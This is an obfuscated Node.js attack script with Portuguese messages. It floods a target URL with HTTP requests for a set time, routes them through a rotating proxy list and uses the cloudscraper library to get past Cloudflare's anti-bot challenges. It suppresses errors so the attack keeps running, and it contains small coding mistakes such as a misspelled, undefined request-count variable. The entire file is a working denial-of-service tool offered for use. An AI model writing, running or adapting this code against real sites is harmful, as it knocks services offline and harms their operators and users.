const _0x563aa4=_0xbcb6;(function(_0x594aae,_0x49650a){const _0x55ba28=_0xbcb6,_0x51c1ab=_0x594aae();while(!![]){try{const _0x25bade=-parseInt(_0x55ba28(0xdc))/0x1*(parseInt(_0x55ba28(0xda))/0x2)+-parseInt(_0x55ba28(0xf4))/0x3+-parseInt(_0x55ba28(0xd8))/0x4*(parseInt(_0x55ba28(0xee))/0x5)+parseInt(_0x55ba28(0xd5))/0x6*(-parseInt(_0x55ba28(0xea))/0x7)+parseInt(_0x55ba28(0xed))/0x8*(parseInt(_0x55ba28(0xd9))/0x9)+-parseInt(_0x55ba28(0xe5))/0xa+parseInt(_0x55ba28(0xde))/0xb;if(_0x25bade===_0x49650a)break;else _0x51c1ab['push'](_0x51c1ab['shift']());}catch(_0x33f83a){_0x51c1ab['push'](_0x51c1ab['shift']());}}}(_0x4e65,0x83e10),require('events')['EventEmitter'][_0x563aa4(0xd4)]=0x0);const fs=require('fs'),CloudScraper=require(_0x563aa4(0xf5)),path=require('path');process[_0x563aa4(0xf1)][_0x563aa4(0xeb)]!==0x6&&(console[_0x563aa4(0xe3)](_0x563aa4(0xdb)+path[_0x563aa4(0xf2)](__filename)+_0x563aa4(0xf0)+path[_0x563aa4(0xf2)](__filename)+_0x563aa4(0xd7)),process['exit'](0x0));const alvo=process[_0x563aa4(0xf1)][0x2],tempo=process[_0x563aa4(0xf1)][0x3],requests_por_ip=process['argv'][0x4];let proxies=fs[_0x563aa4(0xe8)](process[_0x563aa4(0xf1)][0x5],_0x563aa4(0xf3))[_0x563aa4(0xe1)](/\r/gi,'')[_0x563aa4(0xd6)]('\x0a')[_0x563aa4(0xe4)](Boolean);function _0xbcb6(_0x39f90c,_0x3f44fa){const _0x4e6587=_0x4e65();return _0xbcb6=function(_0xbcb65d,_0x1e32af){_0xbcb65d=_0xbcb65d-0xd4;let _0x205a0b=_0x4e6587[_0xbcb65d];return _0x205a0b;},_0xbcb6(_0x39f90c,_0x3f44fa);}function _0x4e65(){const _0x41a017=['length','uncaughtException','8sZGooD','3070uFEDjB','splice','\x20<url>\x20<tempo>\x20<requests_por_ip>\x20<proxies>\x0aUso:\x20node\x20','argv','basename','utf-8','98136hhmxAP','cloudscraper','random','defaultMaxListeners','12HUJOAy','split','\x20<http://tmj.com>\x20<60>\x20<100>\x20<http.txt>','6268WKpwtI','8049528zZvFDJ','26TJIHUX','\x0aUso:\x20node\x20','82227QCSulv','then','24460348XBFRqq','message','headers','replace','floor','log','filter','800310szUByg','exit','Ataque\x20encerrado.','readFileSync','indexOf','1519182uquVyp'];_0x4e65=function(){return _0x41a017;};return _0x4e65();}function enviar_requests(){const _0x4e6c0d=_0x563aa4;let _0x4284bd=proxies[Math[_0x4e6c0d(0xe2)](Math[_0x4e6c0d(0xf6)]()*proxies['length'])],_0x1dd5ba=new Promise(function(_0x29cb97,_0x59164e){CloudScraper({'uri':alvo,'resolveWithFullResponse':!![],'proxy':'http://'+_0x4284bd,'challengesToSolve':0xa},function(_0x480fa1,_0x929734){const _0x19b37e=_0xbcb6;if(_0x480fa1){let _0x2d44b2=proxies[_0x19b37e(0xe9)](_0x4284bd);return proxies[_0x19b37e(0xef)](_0x2d44b2,0x1),console[_0x19b37e(0xe3)](_0x480fa1[_0x19b37e(0xdf)]);}_0x29cb97(_0x929734['request'][_0x19b37e(0xe0)]);});});_0x1dd5ba[_0x4e6c0d(0xdd)](function(_0x1d9886){for(let _0x4c1a2d=0x0;_0x4c1a2d<requets_por_ip;++_0x4c1a2d){CloudScraper({'uri':alvo,'headers':_0x1d9886,'proxy':'http://'+_0x4284bd,'followAllRedirects':![]},function(_0x1dd4da,_0xfc1a4f){const _0x2a8b81=_0xbcb6;_0x1dd4da&&console['log'](error[_0x2a8b81(0xdf)]);});}});}setInterval(()=>{enviar_requests();}),setTimeout(()=>{const _0x305f5b=_0x563aa4;console['log'](_0x305f5b(0xe7)),process[_0x305f5b(0xe6)](0x0);},tempo*0x3e8),process['on'](_0x563aa4(0xec),function(_0x5c2049){}),process['on']('unhandledRejection',function(_0x3b3463){});